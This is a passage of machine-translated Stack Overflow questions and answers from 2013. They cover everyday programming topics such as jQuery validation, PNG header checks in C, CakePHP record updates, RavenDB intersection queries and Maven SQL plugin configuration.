var itemsperrow = Math.floor(containerwidth/ itemwidth);
var column = Math.ceil(itemindex / itemsperrow ) 
```

这是从 1 而不是 0 开始的项目索引；

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-19T21:28:10.500

1.  通过取（行宽）/（元素宽度）的底数，找出一行中有多少个元素。
2.  除以每行元素给出的索引号（您刚刚计算出）。这将为您提供行位置。
3.  接下来通过从步骤 1 中获取剩余部分来找到列位置（您可以使用模数）。将余数乘以每行的元素数。那将是它所在的列。

示例：每行 3 个元素，第 4 个元素： floor(4/3) = 1（第 1 行）余数 = (4%3)=1（列位置）

请注意您从哪个索引开始（无论是 0 还是 1）。此示例从 1 开始。如果您想从 0 开始，则通过减去 1（索引号）将其移入。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-19T21:29:21.737

像这样的东西？

```
var cells = document.querySelectorAll('.container').children(),
    container_width = 1200,
    cell_width = 200,
    total_cols = container_width/cell_width,

    calculateCoords = function (index) {
        return coords {
            col: index%total_cols,
            row: Math.ceil(index/total_cols)
        };
    };

//EXAMPLE USAGE FOR CELL INDEX = 3;
var index_3_coords = calculateCoords(3);
console.log(index_3_coords); //{ col: 3, row: 1 } 
```

# javascript - 根据 id jquery 验证选择字段

> ID：15510501
> 
> 赞同：0
> 
> 时间：2013-03-19T21:10:06.070
> 
> 标签：javascript, jquery, html

我有一个像

```
<div class='form-field-box even' id="one_field_box">
    <div class='form-display-as-box' id="one_display_as_box">
        one<span class='required'>*</span>  :
    </div>
    <select id='one'  name='one'   data-placeholder="Select one" class="chzn-select"  style="width:300px;" tabindex="4">
      <option value='0'></option>
      <option value='Corto' selected='selected' >Corto</option>
      <option value='Largo'  >Largo</option>
    </select>               
    <div class="form-error"></div>
    <div class='clear'></div>   
</div> 
```

我有一个脚本：

```
function validate(id, error) {
    var obj = $('#' + id);
    if(obj.val() == '0' || obj.val() == ''){
        obj.parent().parent().find('.form-error').html(error);
        return true;
    }
return false;
} 
```

我称这个函数为：

```
validate('one', "error in field one."); 
```

我没有得到正确的导航，你能帮我更正 validate() 函数吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:13:59.213

您可以尝试获取正确的目标错误消息容器。***并且您需要`validate()`使用任何事件处理程序来触发该方法。***

我认为您需要在`select`更改时触发验证功能：

```
$('select.chzn-select').on('change', function() {
   validate( this.id, 'error in field '+ this.id +'.');
});

obj        // select#one
 .parent() // div.form-field-box
 .find('.form-error') // error viewer
 .html(error); 
```

或者

```
obj       // select#one
 .next()  // div.form-field-box
 .find('.form-error') // error viewer
 .html(error); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:16:06.673

确保你`validate()`在某些事件之后打电话，例如。`change`或者`submit`等等……

见小提琴：http: [//jsfiddle.net/amyamy86/9CC2b/](http://jsfiddle.net/amyamy86/9CC2b/)

此外，`===`用于严格比较：

```
if (obj.val() === '0' || obj.val() === '') { 
```

要对一组元素进行验证，例如`<select class="validateMe">`单击按钮：

```
function validate(id, error) {
    var obj = $('#' + id);
    if (obj.val() === '0' || obj.val() === '') {
        obj.parent().parent().find('.form-error').append('<p>' + error + '</p>');
        return true;
    }
    return false;
}

$('#validate').click(function () {
    $('.form-error').html('');    // clear existing errors
    $('select.validateMe').each(function () {
        var select = $(this);
        var id = $(this).attr('id');    // get id of each select
        validate(id, 'error in field ' + id);
    });
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-19T21:16:50.873

由于看起来您正在对您的 id 使用一些约定，因此我只需构建表单 id 即可在该范围内找到它。

```
if(obj.val() === '0' || obj.val() === ''){

    $("#" + id + "_field_box .form-error").html(error)
    return true;
} 
```

额外的好处是，如果您更改选择的位置，您将不会破坏验证逻辑。

**更新** 我还建议使用严格相等

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-19T21:21:56.303

由于您使用的是 jquery，因此请使用 parent() 方法，即使将来您计划在下拉列表中添加另一个包装器，它仍然可以使用。

```
function validate(id, error) {
    var obj = $('#' + id);
    if(obj.val() == '0' || obj.val() == ''){
        $('.form-error',obj.parent('#one_field_box')).html(error);
       return true;
    }
return false;
} 
```

# android - Android 4+ 不显示网格布局中的选项菜单

> ID：15510505
> 
> 赞同：-4
> 
> 时间：2013-03-19T21:10:15.743
> 
> 标签：android, layout, user-interface, interface, menu

我在带有菜单的 Android 4+ 中遇到了一些麻烦，因为它在列表中显示菜单项。但是我无法将它设置为像以前那样以类似网格的布局显示，我在活动清单上尝试了**@android:style/Theme.Holo.Wallpaper.NoTitleBar**但是当我这样做时，我的操作栏'正在使用消失，应用程序有一个操作栏。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:37:53.293

> 我无法将它设置为像以前那样以类似网格的布局显示

无法在保留应用程序整体现代外观的同时恢复旧行为。此外，该用户设备上的所有其他应用程序都将“在列表中显示菜单项”。请允许您的应用像用户设备上的所有其他应用一样运行。

# c - 打开一个 png 文件并在 C 中读取它的十六进制值

> ID：15510507
> 
> 赞同：3
> 
> 时间：2013-03-19T21:10:32.480
> 
> 标签：c, png, hex

我正在尝试读取具有任何文件类型结尾的文件，并根据它的十六进制值确定它是否是 PNG 文件。

到目前为止，我已经尝试了两条不同的路径，但都没有奏效。

*   首先，我读取前 16 个字符，因为前 8 个十六进制值确定它是否具有正确的标题。然后我尝试将它分开并读取它与此处其他线程中显示的十六进制值一样。
*   另一个我只想读取前两个值并确定它是否是十六进制值，甚至看看它是否工作。它不是。

代码：

```
int IS_PNG_FILE(char *name)
{
    FILE *dat = fopen (name, "rt");
    if (dat == NULL) return 1;
    int data_point;

    char buf[16], a[16];
    fgets(buf, 16, dat);
    printf("%s\n", buf);
    int i, b;
    for (i=0; i<16; i++)
    {
        sscanf(&buf[i], "%2x", &b);
        a[i] = b;
        i += 2;
    }
    printf("%d\n", a);

    fscanf(dat, "%2x", &data_point);
    printf("%d\n", data_point);

    fclose(dat);
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-19T21:58:43.763

为了从文件中读取二进制字节，请使用`fread`：

函数 fread() 从 stream 指向的流中读取数据的 nmemb 元素，每个 size 字节长，并将它们存储在 ptr 给定的位置。

就像是：

```
unsigned char head[8];

fread(head, sizeof(head), 1, dat); 
```

您可以检查返回值以验证是否实际读取了 8 个字节。

然后使用 memcmp 进行比较

```
unsigned char signature[8] = {0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A};

if (!memcmp(signature, head, 8))
{
    ...
} 
```

# csv - 多次运行后 fgets 和 strtok 崩溃并出现分段错误

> ID：15510508
> 
> 赞同：0
> 
> 时间：2013-03-19T21:10:33.183
> 
> 标签：csv, fgets, strtok

我有一个 csv 文件，我读取该文件以获取我需要进行查找的 IP 地址。我决定使用 fgets 和 strtok 来获取 csv 文件每一行中的 IP 地址。IP 地址是文件中的第 4 个标记（我将计数器开始为 0 作为第一个标记）它读取行，标记记录，但它似乎没有退出 while 循环来执行其余的查找过程使用我找到的 IP 地址令牌。此外，它似乎对文件进行了额外读取，导致运行时出现分段错误

这是代码..希望您能提供帮助，因为我是 c 新手，我正在尝试使用 c 而不是 java，因为代码在 c 中运行得更快

```
#include "GeoIP.h"
#include "GeoIPCity.h"

static const char * _mk_NA( const char * p ){
 return p ? p : "N/A";
}

int 
main(int argc, char *argv[])
{
  FILE           *f;
  FILE           *out_f;
  GeoIP          *gi;
  GeoIPRecord    *gir;
  int             generate = 0;
  char            iphost[50];
  char            *nextWordPtr = NULL;
  int             wordCount =0;
  char            *rechost;
  char            recbuffer[1000];
  char delims[]=",";
  const char     *time_zone = NULL;
  char          **ret;
  if (argc == 2)
    if (!strcmp(argv[1], "gen"))
      generate = 1;

  gi = GeoIP_open("../data/GeoIPCity.dat", GEOIP_MEMORY_CACHE);

  if (gi == NULL) {
    fprintf(stderr, "Error opening database\n");
    exit(1);
  }

  f = fopen("city_test.txt", "r");

  if (f == NULL) {
    fprintf(stderr, "Error opening city_test.txt\n");
    exit(1);
  }

  out_f = fopen("out_city_lookup_test.txt", "w");

  if (out_f == NULL) {
    fprintf(stderr, "Error opening out_city_lookup_test.txt\n");
    exit(1);
  }

//** Read the file line by line and get the ip address to use to lookup GeoIP **//
//*     while (!feof(f)) {
   while (fgets(recbuffer,1001,f) != NULL {
         nextWordPtr = strtok (recbuffer,delims); 
         while (nextWordPtr != NULL & wordCount < 5) {
           printf("word%d %s\n",wordCount,nextWordPtr);
           if (wordCount == 4 ) {
               printf("nextWordPtr %s\n",nextWordPtr);
               strcpy(iphost, nextWordPtr);
               printf("iphost %s\n",iphost);
           }    
           wordCount++;
           nextWordPtr = strtok(NULL,delims);
         }
    gir = GeoIP_record_by_name(gi, (const char *) iphost);

    if (gir != NULL) {
      ret = GeoIP_range_by_ip(gi, (const char *) iphost);
      time_zone = GeoIP_time_zone_by_country_and_region(gir->country_code, gir->region);
      printf("%s\t%s\t%s\t%s\t%s\t%s\t%f\t%f\t%d\t%d\t%s\t%s\t%s\n", iphost,
         _mk_NA(gir->country_code),
         _mk_NA(gir->region),
         _mk_NA(GeoIP_region_name_by_code(gir->country_code, gir->region)),
         _mk_NA(gir->city),
         _mk_NA(gir->postal_code),
         gir->latitude,
         gir->longitude,
         gir->metro_code,
         gir->area_code,
         _mk_NA(time_zone),
         ret[0],
         ret[1]);
      fprintf(out_f,"%s\t%s\t%s\t%s\t%s\t%s\t%f\t%f\t%d\t%d\t%s\t%s\t%s\n", iphost,
         _mk_NA(gir->country_code),
         _mk_NA(gir->region),
         _mk_NA(GeoIP_region_name_by_code(gir->country_code, gir->region)),
         _mk_NA(gir->city),
         _mk_NA(gir->postal_code),
         gir->latitude,
         gir->longitude,
         gir->metro_code,
         gir->area_code,
         _mk_NA(time_zone),
         ret[0],
         ret[1]);
      GeoIP_range_by_ip_delete(ret);
      GeoIPRecord_delete(gir);
    }
  }
  GeoIP_delete(gi);

  fclose(out_f);

  return 0;

} 
```

# xcode - 如何通过电子邮件向 Apple 发送整个 Xcode 项目

> ID：15510509
> 
> 赞同：0
> 
> 时间：2013-03-19T21:10:34.600
> 
> 标签：xcode, compression

我有一个 Xcode 项目 (4.6)，我正在向 Apple 请求技术支持。此过程的一个要求是将您遇到的问题抽象到示例 Xcode 项目中，然后（通过电子邮件）发送该 Xcode 项目。我创建了一个 Xcode 项目，通过获取我的原始项目并删除任何和所有不相关的组件（包括所有图像）来发送它们。然后我尝试压缩 Xcode 文件，但显然它仍然太大而无法发送（110mb）。

尽管我已经看到有关此问题的一两个问题，但除了“使用 git 代替”之外，都没有收到任何回复。但鉴于 Apple 要求我通过电子邮件向他们发送 Xcode 项目，我不得不认为这样做是可能的。

对于如何调整 Xcode 文件的大小和/或通过电子邮件发送其内容，特别是给 Apple 以便他们可以构建和运行它，是否有任何一般性建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:15:48.550

将压缩后的项目添加到保管箱公用文件夹中，并在电子邮件中将 URL 提供给他们。这样他们就可以访问并在您完成后删除文件。

# installation - 将文件内容写入新文件只会写入一半的字符串

> ID：15510515
> 
> 赞同：0
> 
> 时间：2013-03-19T21:10:44.847
> 
> 标签：installation, nsis

我正在尝试做一个非常简单的任务，即在 NSIS 中读取一个文件，然后将这些文件内容写入一个新文件。

**我的问题：**并非所有文件内容都写入新文件，只有一半。怎么了？

Jeez NSIS 最近让我很头疼:(

这是我的代码：

```
Section
    #Read file
    StrCpy $R9 ""             #$R9 will hold the file contents
    FileOpen $R7 "C:\MyFolder\usermenu.4d" "r"

    ReadFileLoop:
        FileRead $R7 $R6
        StrCpy $R9 "$R9$R6"
        #DetailPrint "$R6"
        IfErrors +1 ReadFileLoop

    FileClose $R7

    #Write file contents to new file
    ClearErrors
    FileOpen  $3 "C:\Users\me\Desktop\abc.txt" w
    FileWrite $3 "$R9"
    FileClose $3
SectionEnd 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T22:01:08.413

NSIS 变量具有固定大小，如果文件大于限制，则其中一些将不适合。作为读取循环的一部分，您应该写入另一个文件。

当然，如果你想要一个未经修改的副本，你可以使用`CopyFiles`...

# xcode - 从没有故事板或笔尖的表格视图推送到详细视图？

> ID：15510516
> 
> 赞同：1
> 
> 时间：2013-03-19T21:10:47.377
> 
> 标签：xcode, uitableview, nib, detailview

我正在构建我的第一个应用程序而不使用故事板或笔尖。我想从表格视图推送到详细视图，并且似乎找不到任何资源来显示如何在没有界面生成器的情况下执行此操作。我的表格视图控制器有一个图片、标题和副标题，我希望将这些都传递给细节视图，但我希望细节视图也有一个文本描述。到目前为止，我只能构建我的表格视图控制器。没有笔尖我不知道怎么做剩下的。如何推送到详细视图？如何格式化详细视图？有没有人有我可以看的任何资源或示例代码？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T02:17:31.553

制作 UIViewController 的自定义子类，例如 DetailViewController。要对其进行格式化，请在 -[DetailViewController viewDidLoad] 中编写代码。

因此，在 DetailViewController.m 中，您可以编写：

```
- (void)viewDidLoad {
    [super viewDidLoad];

    // Add a label with some text.
    UILabel *label = [[UILabel alloc] initWithFrame:CGRectMake(10, 10, 100, 40)];
    label.text = @"Some text";
    [self.view addSubview:label];
} 
```

注意：在代码中分隔上述子视图可能具有挑战性。Interface Builder 对此有所帮助。一种想法是使用 Interface Builder 将所有内容分开，然后从 Interface Builder 获取坐标。您也可以使用 nib2objc。

然后，在表视图控制器的实现 (.m) 文件的 -tableView:didSelectRowAtIndexPath: 中，您可以编写：

```
DetailViewController *detailViewController = [[DetailViewController alloc] initWithNibName:nil bundle:nil];
[self.navigationController pushViewController:detailViewController animated:YES]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-02-12T06:37:09.943

如果未实现 navigationController，self.navigationController 将不起作用。我发现新方法 presentViewController 有效。

```
DetailViewController *detailVC = [[DetailViewController alloc]initWithNibName:nil bundle:nil];
detailVC.modalTransitionStyle = UIModalTransitionStyleFlipHorizontal;
[self presentViewController:detailVC animated:YES completion:nil]; 
```

# forms - 在 CakePHP 中更新记录

> ID：15510519
> 
> 赞同：1
> 
> 时间：2013-03-19T21:10:57.490
> 
> 标签：forms, cakephp, sql-update, cakephp-model

所以我正在学习 CakePHP，并且我正在尝试构建一堆可以直接用 PHP 构建的基本应用程序，以了解 CakePHP 的工作原理。现在我正在开发一个基本的订单管理系统——用户可以有多个订单并且订单属于一个用户。

我已经设置了数据库并且正确配置了 CakePHP（起始页面显示所有主题的所有绿色，例如默认时区和数据库连接，但我尚未安装的 DebugKit 除外）。我还有一个“用户列表”页面：

![在此处输入图像描述](../Images/31e6f99d86317304193a430d29052a65.png)

正如您在上面的屏幕截图中实际看到的那样，我遇到的问题是当我尝试在 /users/edit_user 上编辑现有用户时：

![在此处输入图像描述](../Images/f365bf0be6742d1468d4f01f0ac8ae6f.png)

我正在尝试为用户保存编辑，我 (1) 使用`$this->Form->hidden(...)`ID 和 (2) 将主键设置为模型中表的主键`public $primaryKey = 'ID';`

每次我尝试这样做时，它只是插入一条*新*记录而不是更新现有记录，我认为可以通过识别我的 PK 并添加要提交的 ID 来解决问题，但我一定会遗漏一些东西。

以下是相关页面的代码：

模型

```
<?php
/**
 * app/Model/User.php
 *
 */
class User extends AppModel
{
    public $name = 'User';
    public $primaryKey = 'ID';

    // <hasMany>
    public $hasMany = array(
                            'Order' => array('dependent' => true)
                        );
}

?> 
```

控制器

```
<?php
/**
 * app/Controller/UsersController.php
 *
 */
class UsersController extends AppController
{
    //public $scaffold;

    /* Validation */
    public $validate = array(
            'username' => array(
                    'required' => true,
                    'allowEmpty' => false,
                    'loginRule1' => array(
                        'rule' => 'alphaNumeric',
                        'message' => "Usernames must be alphanumeric!"
                                        ),
                    'loginRule2' => array(
                        'rule' => array('minLength', 4),
                        'message' => 'Usernames must be at least 4 characters.'
                                        ),
                                ),
            'password' => array(
                    'required' => true,
                    'allowEmpty' => false,
                    'passwordRule1' => array(
                        'rule' => array('minLength', 4),
                        'message' => 'Passwords must be between 4 and 8 characters.'
                                            ),
                    'passwordRule2' => array(
                        'rule' => array('maxLength', 8),
                        'message' => 'Passwords must be between 4 and 8 characters.'
                                            )
                                )
            );

    /* Actions */

    public function index()
    {
        // Grab all users
        $users = $this->User->find('all');

        // Set/Send users to View
        $this->set('users', $users);
    }

    public function new_user()
    {
        /* Has any Form data been POST'd? */
        if ($this->request->is('post'))
        {
            // Save User data to the DB
            $this->User->save($this->request->data);

            $this->redirect('/users');
        }
    }

    /*
        Accessing Args:
            (1) Direct URL Routing Method
                --> ...
            (2) Named Params Method
                --> CakeRequest['named']['[name]']
    */
    public function edit_user($id = null)
    {
        $id = $this->request['named']['currentID'];

        // Display the current data of the user
        if (!empty($id))
        {
            $userInfo = $this->User->find('all', 
                    array('conditions' => array('User.ID' => $id)));

            $this->set('userData', $userInfo);
        }
        else
            $this->set('error', '$id is empty!');

        /* Has any Form data been POST'd? */
        if ($this->request->is('post'))
        {
            // Save User data to the DB
            $this->User->save($this->request->data);

            $this->redirect('/users');
        }
    }
}

?> 
```

查看/用户/edit_user.ctp

```
<div class="row-fluid">

    <div class-"span12"></div>
    <div class="span12"></div>

    <div class="span8 offset2">

        <?php
            echo "Hidden ID Field Value: " . $userData[0]['User']['ID'];
            echo "<hr>";

            echo $this->Form->create('User');
            echo $this->Form->input('username');
                echo "  Current Name: " . 
                    $userData[0]['User']['username'];
            echo $this->Form->input('password');
                echo "  Current password: " . 
                    $userData[0]['User']['password'];

            // Hidden ID field to make save ~ an UDATE
            echo $this->Form->hidden('User', 
                    array('ID' => $userData[0]['User']['ID'],
                            'type' => 'hidden'));

            echo $this->Form->end('Save');

        ?>
    </div>

</div> 
```

有没有人看到我没有做这将允许我*编辑*/更新现有记录而不是插入一个全新的记录？谢谢你的时间！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-19T22:12:29.083

您不需要在表单中回显值，CakePHP 比这更聪明。改为这样做：

```
<?php
class UsersController {

    public function edit($id) {
        if ($this->request->is('post')) {
            if ($this->User->save($this->request->data)) {
                $this->Session->setFlash('User successfully saved.');
                $this->redirect(array('action' => 'index'));
            }
        }
        else {
            $this->request->data = $this->User->findById($id);
        }
    }
} 
```

然后在您的视图中创建一个表单，如下所示：

```
<?php
    echo $this->Form->create('User');
    echo $this->Form->input('User.name');
    // and any other fields
    echo $this->Form->input('User.id', array('type' => 'hidden'));
    echo $this->Form->end('Save user');
?> 
```

CakePHP 将根据`$this->request->data`.

CakePHP 食谱上的[博客教程](http://book.cakephp.org/2.0/en/tutorials-and-examples/blog/blog.html)是掌握框架及其概念的一个很好的起点。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-19T22:06:58.680

问题可能与这里使用的 Form 元素的类型有关；我建议在你的`/View/Users/edit_user.ctp`文件中尝试这样的事情：

```
// Hidden ID field to make save an UPDATE
echo $this->Form->input('id', array('type' => 'hidden')); 
```

更多关于保存编辑的信息可以在[CakePHP 博客教程](http://book.cakephp.org/2.0/en/tutorials-and-examples/blog/part-two.html#editing-posts)中找到。

# java - 在jsp中显示多个BufferedImage

> ID：15510521
> 
> 赞同：0
> 
> 时间：2013-03-19T21:10:59.957
> 
> 标签：java, image, jsp, bufferedimage

我有 100 个`BufferedImage`对象`ArrayList`，我想在 jsp 中显示所有这些图像。

```
<%
  ArrayList<BufferedImage> list = GlobalData.getImageBufferArrayList();
%>

 </head>
 <body>
 <ul>
 <li><img alt="" src=""> </li>//image1
 <li><img alt="" src=""> </li>//image2
 <li><img alt="" src=""> </li>//image3
   ...
   ..
   ...
 </ul>
</body> 
```

我不知道`src`在这些图像上放什么

是否可以将图像数据作为`src`图像放置。（就像我们从`canvas`html 中获取图像数据一样）

或者是他们展示这些图像的任何体面的方式。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:43:59.627

您要么必须将图像文件嵌入 HTML 文档，要么通过单独的 HTTP 请求使其可用。对于前者，您可以使用[`data:`URI 方案](http://en.wikipedia.org/wiki/Data_URI_scheme)。对于后者，您必须提供一个单独的 servlet，或者在同一个 servlet 中提供一个单独的代码路径，它将为图像文件提供服务。它可能会从一些短暂的缓存中执行此操作，因此您不必再次执行相同的代码来获取这些图像。

一般来说，嵌入数据的大小开销与图像的大小成正比，而单独的请求的资源开销与 HTTP 请求的数量成正比。对于小图像，前者可能会更好，而对于大图像，后者会更快。实现嵌入应该比实现合理的图像缓存更容易，但我不能 100% 确定是否所有浏览器都支持数据方案。

在任何一种情况下，您都必须首先将 序列化为[`BufferedImage`](http://docs.oracle.com/javase/7/docs/api/java/awt/image/BufferedImage.html)某个字节序列，可能[`ImageIO.write`](http://docs.oracle.com/javase/7/docs/api/javax/imageio/ImageIO.html#write%28java.awt.image.RenderedImage,%20java.lang.String,%20java.io.OutputStream%29)与[`ByteArrayOutputStream`](http://docs.oracle.com/javase/7/docs/api/java/io/ByteArrayOutputStream.html).

# php - 如果 HasMany 尚不存在，CakePHP 将通过它保存

> ID：15510525
> 
> 赞同：0
> 
> 时间：2013-03-19T21:11:10.000
> 
> 标签：php, database, cakephp

我想知道是否有可能在 CakePHP 中轻松实现以下目标：

我有三个模型。*食谱*、*成分*和*RecipeIngredients*。一个配方可以有许多*成分*，关系通过模型配方成分保存，因此我们有一个 HasMany 直通关系*。*

现在，当添加一个新配方时，我有多个成分，可以很容易地保存 `$this->Recipe->saveAssociated();`- 只要我已经知道成分的外键。
然而，由于可能有无数种成分，因此不可能将它们全部填充到一个`<select>`字段或类似的东西中。因此，我希望用户填写一个字段`$this->Recipe->RecipeIngredient->Ingredient['title']`并根据现有条目的标题检查数据库，如果是，获取 id 并将其填充到*RecipeIngredients*表中，否则创建一个新成分并将该 id 保存到*RecipeIngredients*

通常 CakePHP 充满了快捷方式，但在这种情况下我找不到任何东西，但也许有一个我忽略的简单解决方案..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T12:49:43.787

好吧，你可以做的是`beforeSave`在你的模型中创建一个函数。如果`POST'ed`成分的数据已经存在（您可以在选项中查找 LIKE is 的位置`Ingredient['title']`）获取 ID 并将其存储在 POST'ed 数组中。如果您的数据库中还没有这样的成分，请直接存储它，获取保存的 ID 并将其存储在您的 POST 数组中。

# http - HTTP URL 中保留字符的特定用途

> ID：15510526
> 
> 赞同：2
> 
> 时间：2013-03-19T21:11:10.237
> 
> 标签：http, uri, rfc

我看过很多页面，它们为 URI 提供了相同的未保留和保留字符列表，所以我很清楚允许和禁止哪些字符以及一般来说在什么上下文中。

然而，关于不同字符在 URL 的不同段中的实际含义几乎为零的文档，尤其是子分隔字符集：“！” /“$”/“&”/“'”/“（”/“）”/“*”/“+”/“”/“;” /“=”

我能够从任何来源（几个 RFC 和众多文档站点，包括其他几个 Stack Overflow 问题）中找到的唯一信息是：

*   和号和分号用于分隔查询字符串中的键值对。
*   等号用于将键与键值对中的值分开。
*   加号替换键值对值中的空格。

但这留下了“！”，“$”，“'”，“（”，“）”，“*”和“，”下落不明。那么，具体来说，它们在 HTTP 方案 URI 的上下文中做了什么？

# javascript - CSS3中的连字@font-face

> ID：15510527
> 
> 赞同：0
> 
> 时间：2013-03-19T21:11:14.637
> 
> 标签：javascript, css, font-face, ligature

我听说可以在 CSS3 @font-face 图标/符号字体中使用连字，但 IE 9 及更低版本不支持它。

有谁知道如何让他们在 IE 9 及更低版本中工作？有没有办法用 JavaScript 或 JQuery 做到这一点？

当不支持连字时，我能想到的唯一解决方案是将多字母（连字）内容切换为代表相同符号的单个字母。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T22:08:13.167

可以通过使用[`font-feature-settings`](https://developer.mozilla.org/en-US/docs/CSS/font-feature-settings)属性或[`text-rendering`](https://developer.mozilla.org/en-US/docs/CSS/text-rendering)属性的浏览器前缀版本来启用连字（或者，原则上，`font-variant-ligatures`，但任何浏览器可能还不支持）。这些对已安装字体和可下载字体都有效，前提是该字体包含 OpenType 格式的连字和有关它们的信息（网页上常用的大多数字体都没有）。

但是 IE 9 和更早版本不支持这些。可能没有基于 JavaScript 的方法来克服这个问题。用连字字符替换字符序列当然是可能的，但它只适用于一小部分连字，即那些在 Unicode 中被编码为字符的连字（并且仅适用于包含它们的字体）。

# mysql - 大型数据库处理

> ID：15510529
> 
> 赞同：-1
> 
> 时间：2013-03-19T21:11:28.980
> 
> 标签：mysql, mongodb, jdbc, database-design, database

晚上好。

所以，我必须存储不同地方的信息。每个地方都有不同的信息，包括标题、类别和位置。问题是我将有大约 5000 万个地点，我必须按标题、类别和位置（包括街道、国家等）来搜索它们。

我已经安装了 MySql 和 mongoDB，但也接受了其他替代方案。此外，服务器现在只有 2GB（稍后会增加 - 更多 RAM 甚至可能是集群......但稍后），我不确定它是否足够。硬盘空间应该绰绰有余。

我的一些想法是为每个地方创建标签，并按标签搜索（标签将是我用于搜索和索引的字段），但我不确定这是否是一个好主意以及如何更好地实施.

关于如何更好地实施它有什么建议吗？我将只用所有信息填写一次，然后仅将其用于搜索。

PS：在当前的测试版本中，我使用的是来自 JAVA 的 MySql 数据库和 JDBC（虽然它比 JPA 解决方案更快）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:19:49.643

我会考虑 5000 万行中等大小。当然不是“大”，并且在 MySQL 或 Mongo DB 的处理能力范围内。

SQL（例如 MySQL）与 NoSQL（例如 Mongo DB）的选择应该由一系列广泛的考虑因素驱动，包括性能要求、查询模式、分片要求（Mongo DB 在这里很强大）和团队的经验。对于您不熟悉的数据库，要完成所有操作任务需要相当长的学习曲线。

您必须拥有的 RAM 数量由工作集决定……通常是全天访问的记录数。如果某些记录被大量访问（加利福尼亚州洛杉矶）而其他记录很少被访问（加利福尼亚州洛斯巴诺斯），则与以相同可能性访问所有记录相比，您需要更少的内存来获得良好的整体性能。在流程中尽早进行性能测量，以便您可以计划所需的 RAM 量。

通过地理搜索，如果您允许自由文本输入，用户通常会提供不完整的信息或部分不正确的信息。标签对此并没有真正的帮助。

如果您以结构化方式（例如下拉菜单）呈现位置选择，您可以只使用位置的主键作为“标签”。

# nosql - RavenDB：子集合交叉点

> ID：15510533
> 
> 赞同：0
> 
> 时间：2013-03-19T21:12:05.507
> 
> 标签：nosql, ravendb, nosql-aggregation

我是 RavenDB 的新手，我有一个 Raven DB 文档：

```
Student
{
  Id : int
  Subjects : List<int>
} 
```

我正在尝试编写查询以获取 id 为 1 的学生和 id 为 2 的学生的科目的交集

```
{
  ID : 1
  Subjects : {22, 23, 25}
}

{
  ID : 2
  Subjects : {22, 25 }
} 
```

这些交叉点将是 {22,25} 在这种情况下，我还需要交叉点主题 2 的计数。

处理此类查询的最佳方法是什么？还有其他 NoSQL 解决方案可以更好地处理这种查询吗？另外，我正在尝试将学生集合缓存在内存中。

我需要一个支持分片的数据库，而且我有一个包含 1500 万个文档的数据集（我可以使用 Raven 或 Mongo 等数据库解决方案将它们分片到不同的机器上）。我必须在数据库级别执行此操作，并且在 RavenDB 文档中找不到任何如何在数据库级别执行此操作的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T00:06:13.250

根据您的评论（这不是您最初的问题），您可以执行以下查询：

```
var q = session.Query<Student>()
               .Where(x => x.Subjects.Any(y => y == 22))
               .Intersect()
               .Where(x => x.Subjects.Any(y => y == 25)); 
```

等效的 Lucene 查询将是：

```
Subjects:22 INTERSECT Subjects:25 
```

鉴于此数据：

```
Student { Id = 1, Subjects = new List<int> { 22, 23, 25 } }
Student { Id = 2, Subjects = new List<int> { 22, 25 } }
Student { Id = 3, Subjects = new List<int> { 23, 25} }
Student { Id = 4, Subjects = new List<int> { 22 } } 
```

只会返回学生 1 和 2，因为 3 和 4 没有两个值。

您可以在文档中阅读更多关于[交叉查询](http://ravendb.net/docs/client-api/querying/intersection)的信息。

# mysql - 当 SQL 插件无法连接到数据库时，我可以让 Maven 打印出自定义错误消息吗？

> ID：15510535
> 
> 赞同：1
> 
> 时间：2013-03-19T21:12:10.213
> 
> 标签：mysql, maven, error-handling, maven-plugin

我正在使用 Maven 3.0.3、MySQL 5.5 和 Maven SQL 插件（v 1.5）为我的 JUnit 测试创建一个测试数据库......

```
 <plugin>
                    <groupId>org.codehaus.mojo</groupId>
                    <artifactId>sql-maven-plugin</artifactId>
                    <version>1.5</version>
                    <dependencies>
                        <dependency>
                            <groupId>mysql</groupId>
                            <artifactId>mysql-connector-java</artifactId>
                            <version>5.1.18</version>
                        </dependency>
                    </dependencies>
                    <!-- common configuration shared by all executions -->
                    <configuration>
                        <driver>com.mysql.jdbc.Driver</driver>
                        <url>jdbc:mysql://${test.mysql.db.host}:${test.mysql.db.port}/${test.mysql.db.sid}</url>
                        <username>${test.mysql.db.user}</username>
                        <password>${test.mysql.db.password}</password>
                        <!--all executions are ignored if -Dmaven.test.skip=true -->
                        <skip>${maven.test.skip}</skip>
                    </configuration>

                    <executions>
                        <execution>
                            <id>create-test-db</id>
                            <phase>compile</phase>
                            <goals>
                                <goal>execute</goal>
                            </goals>
                            <configuration>
                                <url>jdbc:mysql://${test.mysql.db.host}:${test.mysql.db.port}</url>
                                <username>${test.mysql.db.user}</username>
                                <password>${test.mysql.db.password}</password>
                                <autocommit>true</autocommit>
                                <sqlCommand>create database if not exists ${test.mysql.db.sid}</sqlCommand>
                            </configuration>
                        </execution>
                    </executions> 
```

如果无法建立连接（因为尚未创建用户或拥有错误的权限），我想显示一条比默认情况下打印出来的错误消息更友好的错误消息。有谁知道这是怎么做到的吗？我愿意使用除 Maven SQL 插件之外的其他插件。

谢谢， - 戴夫

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:24:54.240

